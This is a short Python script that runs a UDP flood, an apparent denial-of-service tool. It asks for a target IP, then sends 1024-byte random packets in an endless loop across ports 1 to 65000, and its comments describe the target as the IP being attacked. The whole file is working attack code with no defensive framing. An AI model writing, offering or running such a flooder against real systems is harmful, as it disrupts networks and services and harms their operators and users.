import socket
import random


sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
bytes=random._urandom(1024) #Creates packet to use
ip=str(input('Target IP: ')) #The IP we are attacking locally
port=int(input('Port: ')) #Port we direct to attack will add 1 each time it loops
sent = 0 #Defining how many have been sent
while 1: #Infinitely loops sending packets to the port until the program is exited.
			sock.sendto(bytes,(ip,port))
			sent= sent + 1 #adding one to the sent number
			port= port + 1 #adding one to the port numbe
			print ("Sent %s amount of packets to %s at port %s." % (sent,ip,port)) #printing how many times it has sent it and what port it sent to.
			if port > 65000:
				port = 1
